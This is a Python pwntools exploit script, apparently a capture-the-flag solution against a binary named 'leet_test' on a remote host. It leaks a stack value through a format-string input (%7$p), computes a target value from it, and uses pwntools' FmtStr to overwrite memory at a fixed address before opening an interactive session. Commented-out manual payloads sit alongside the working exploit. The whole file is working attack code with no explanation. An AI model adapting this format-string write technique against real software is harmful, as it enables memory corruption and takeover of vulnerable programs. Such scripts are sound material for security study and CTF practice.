#!/usr/bin/python3

from pwn import *
import sys
import binascii

def runmain():
	
	prc_name = './leet_test'
	context.arch = 'amd64'
	context.log_level = 'debug'

	# if len(sys.argv) > 1:
	# 	gdbscript = '''
	# 	init-pwndbg
	# 	piebase
	# 	continue
	# 	'''.format(**locals())
	# 	io = gdb.debug(prc_name, gdbscript=gdbscript)
	# else:
	# 	io = process('./leet_test')

	io = remote('159.65.31.52', 31145)

	io.sendlineafter(f'Please enter your name: ', b'%7$p')
	random_value = io.recvline()

	print(f'{random_value}')

	idx = random_value.find(b'0x') + 2
	random_value = random_value[idx:idx+4].decode()
	random_value = int(random_value, 0x10)

	print(f'the random value is: {random_value}')

	target_value = random_value * 0x1337c0de
	print(f'The target value: {hex(target_value)}')

	def send_payload(payload):
		io.sendlineafter('Please enter your name: ', payload)
		return io.recvline()
	
	format_string = FmtStr(execute_fmt=send_payload)
	format_string.write(0x00404078, target_value)
	format_string.execute_writes()

	io.interactive()
	# print(f'the random value is: {random_value}')
	
	# winner = p64(0x00404078)
	# payload = winner + b'%10$'

	# payload = b'991234567899999999999999999%14$n' + winner
	# print(f'the payload is: {payload}')
	# input('IDA> ')
	# io.sendlineafter(f'Please enter your name: ', payload)
	
	io.interactive()


if __name__ == '__main__':
	runmain()
